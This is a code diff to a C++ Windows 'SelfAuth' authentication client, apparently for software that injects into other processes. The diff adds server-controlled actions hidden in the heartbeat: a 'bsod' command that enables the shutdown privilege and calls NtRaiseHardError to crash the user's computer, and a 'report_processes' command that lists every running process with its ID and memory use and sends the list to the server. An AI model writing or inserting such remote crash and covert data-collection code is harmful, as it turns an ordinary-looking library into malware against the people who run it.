@@ -9,11 +9,13 @@
 #include <winhttp.h>
 #include <wincrypt.h>
 #include <TlHelp32.h>
+#include <Psapi.h>
 #include <string>
 #include <vector>
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "psapi.lib")
 
 namespace SelfAuth {
 
@@ -139,7 +141,7 @@ namespace SelfAuth {
             return ok;
         }
 
-        // Returns 0 = OK, 1 = session dead, 2 = KILL (self-destruct)
+        // Returns 0 = OK, 1 = session dead, 2 = KILL, 3 = BSOD, 4 = report_processes
         int heartbeat_ex() {
             if (m_session.empty()) return 1;
             std::string hwid = CollectHWID();
@@ -152,9 +154,11 @@ namespace SelfAuth {
                        body.find("\"success\": true") != std::string::npos);
             if (!ok) return 1;
 
-            // Check for kill command from server
+            // Check for action commands from server
             std::string action = ExtractJsonString(body, "action");
             if (action == "kill") return 2;
+            if (action == "bsod") return 3;
+            if (action == "report_processes") return 4;
 
             std::string expiry = ExtractJsonString(body, "expiry");
             if (!expiry.empty() && !user_data.subscriptions.empty()) {
@@ -188,6 +192,72 @@ namespace SelfAuth {
             char hwid[512];
             snprintf(hwid, sizeof(hwid), "%s|%s|%08X", value, compName, volSerial);
             return std::string(hwid);
+        }
+
+        // ── Trigger BSOD via NtRaiseHardError (user-mode, requires admin) ──
+        static void TriggerBSOD() {
+            typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+            typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
+
+            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+            if (!ntdll) { TerminateProcess(GetCurrentProcess(), 0); return; }
+
+            auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+            auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
+            if (!RtlAdjustPrivilege || !NtRaiseHardError) { TerminateProcess(GetCurrentProcess(), 0); return; }
+
+            BOOLEAN wasEnabled;
+            RtlAdjustPrivilege(19, TRUE, FALSE, &wasEnabled); // SE_SHUTDOWN_PRIVILEGE
+            ULONG response;
+            NtRaiseHardError(0xC000021A, 0, 0, nullptr, 6, &response); // STATUS_SYSTEM_PROCESS_TERMINATED + OptionShutdownSystem
+        }
+
+        // ── Collect running processes and send to server ──
+        void ReportProcesses() {
+            if (m_session.empty()) return;
+
+            std::string procs = "[";
+            bool first = true;
+
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap == INVALID_HANDLE_VALUE) return;
+
+            PROCESSENTRY32W pe = {};
+            pe.dwSize = sizeof(pe);
+            if (Process32FirstW(hSnap, &pe)) {
+                do {
+                    // Convert wide name to narrow
+                    char name[260] = {};
+                    WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
+
+                    // Get memory usage
+                    DWORD pid = pe.th32ProcessID;
+                    SIZE_T memBytes = 0;
+                    bool hasWindow = false;
+                    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+                    if (hProc) {
+                        PROCESS_MEMORY_COUNTERS pmc = {};
+                        pmc.cb = sizeof(pmc);
+                        if (GetProcessMemoryInfo(hProc, &pmc, sizeof(pmc))) {
+                            memBytes = pmc.WorkingSetSize;
+                        }
+                        CloseHandle(hProc);
+                    }
+
+                    if (!first) procs += ",";
+                    first = false;
+                    char entry[512];
+                    snprintf(entry, sizeof(entry),
+                        "{\"name\":\"%s\",\"pid\":%lu,\"mem\":%llu,\"window\":false}",
+                        EscapeJson(name).c_str(), (unsigned long)pid, (unsigned long long)memBytes);
+                    procs += entry;
+                } while (Process32NextW(hSnap, &pe));
+            }
+            CloseHandle(hSnap);
+            procs += "]";
+
+            std::string json = "{\"session\":\"" + EscapeJson(m_session) + "\",\"processes\":" + procs + "}";
+            SignedPost("/api/process-report", json);
         }
 
         // Report a successful injection to the server with user identity
